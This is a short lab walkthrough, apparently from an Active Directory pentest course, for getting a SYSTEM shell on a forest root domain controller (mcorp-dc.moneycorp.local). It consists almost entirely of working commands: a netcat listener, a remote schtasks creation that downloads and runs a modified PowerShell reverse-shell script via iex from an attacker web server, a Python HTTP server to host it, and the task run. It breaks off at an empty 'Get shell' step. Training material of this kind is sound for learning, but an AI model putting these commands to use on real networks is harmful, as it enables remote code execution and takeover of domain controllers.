1. Start listener
```powershell
nc -nvlp 4444
```

2. Now, using the privileges which we achieved above. Such as being able to run WMI or admin privileges on target machine such as a forest root DC. Schedule a task and run it as SYSTEM on mcorp-dc. 
```powershell
# note: PowerShellTcpEx.ps1 was modified with execute function ad end of script so it will execute after it has been downloaded

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck133" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.133/Invoke-PowerShellTcpEx.ps1''')'"

# SUCCESS: The scheduled task "STCheck133" has successfully been created.
```

3. Serve the script on webserver
```powershell
python -m SimpleHTTPServer 80
```

4. Run the scheduled task
```powershell
schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck133" 
# SUCCESS: Attempted to run the scheduled task "STCheck133".
```

5. Get shell
```powershell
